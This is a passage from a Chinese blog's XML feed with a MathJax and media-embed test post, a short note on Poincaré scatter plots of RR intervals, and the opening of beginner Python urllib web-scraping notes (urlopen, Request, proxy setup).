183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msup" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(490, 289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><rect width="1793.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(6247.3, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(7247.5, 0)"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mn" transform="translate(617.8, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mi" transform="translate(1021.3, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(299.4, -719.9)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msup" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(465, 289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><rect width="1793.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(9280.8, 0)"><path data-c="29" d="M34 1438Q34 1446 37 1448T50 1450H56H71Q73 1448 99 1423T144 1380T198 1319T260 1238T323 1137T385 1013T440 864T485 688T514 485T526 251Q526 134 519 53Q472 -519 162 -860Q139 -885 119 -904T86 -936T71 -949H56Q43 -949 39 -947T34 -937Q88 -883 140 -813Q428 -430 428 251Q428 453 402 628T338 922T245 1146T145 1309T46 1425Q44 1427 42 1429T39 1433T36 1436L34 1438Z"></path></g></g></g></g></svg></mjx-container></span></p>
<p>油管视频测试 

<iframe width="560" height="315" src="https://www.youtube.com/embed/UnnvhiD-HPA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

</p>
<p>啤梨啤梨视频测试</p>


<iframe src="//player.bilibili.com/player.html?aid=1085694&cid=1569276&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>


<p>插件测试</p>
<figure>
<img src="/938d/emmm.jpg" alt="測試"><figcaption aria-hidden="true">測試</figcaption>
</figure>
<p>大小调整测试</p>
<p><img width="200" src="测试/emmm.jpg"></p>
<p>嘤花散 <img src="/938d/yinghua.jfif" alt="測試"></p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div></div><div class="group-picture-row"><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div></div><div class="group-picture-row"><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div><div class="group-picture-column"><img src="/938d/emmm.jpg" alt="測試"></div></div></div>
<p>首先对序列<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="6.809ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 3009.6 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(1053, 0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(759, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mn" transform="translate(1123, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span>做一阶差分, 得到序列 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="20.113ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 8890 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(861.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1306, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(1995.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3051.6, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3551.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3996.2, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4496.2, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4940.9, 0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mi" transform="translate(6279.6, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(7389.8, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(8390, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 然后以 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="8.708ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 3849 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1250.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1695, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(520, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1190, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3460, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
]]></content>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫笔记</title>
    <url>/fd19/</url>
    <content><![CDATA[<p>未完待续 <a id="more"></a> #### 浏览器F12调试和抓包</p>
<p>略</p>
<h4 id="urllib库">urllib库</h4>
<h5 id="打开并读取url">打开并读取url</h5>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>``urlopen`<span class="token punctuation">(</span><span class="token operator">*</span>url<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">*</span>data<span class="token operator">=</span><span class="token boolean">None</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">*</span>timeout<span class="token operator">*</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token operator">*</span>cafile<span class="token operator">=</span><span class="token boolean">None</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">*</span>capath<span class="token operator">=</span><span class="token boolean">None</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">*</span>cadefault<span class="token operator">=</span><span class="token boolean">False</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">*</span>context<span class="token operator">=</span><span class="token boolean">None</span><span class="token operator">*</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>常用的函数read()读取, info()返回头信息,getcode()返回状态码,geturl()返回url</p>
<p>一个简单的读写文件:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'https://zhangjk98.xyz'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment"># 读取返回的内容</span>
html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
<span class="token comment"># 写入txt</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'code1.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="完整的url请求">完整的url请求</h5>
<p>使用urllib.request.Request处理完整请求</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> 	origin_req_host<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> unverifiable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>请求方式method有get和post两种, headers为请求头信息</p>
<h5 id="使用代理">使用代理</h5>
<p>使用urllib.request.ProyxHandler()</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 设置代理IP</span>
proxy_handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'218.56.132.157:8080'</span><span class="token punctuation">,</span>
    <span class="token string">'https'</span><span class="token punctuation">:</span> <span class="token string">'183.30.197.29:9797'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token comment"># 必须使用build_opener()函数来创建带有代理IP功能的opener对象</span>
opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>proxy_handler<span class="token punctuation">)</span>
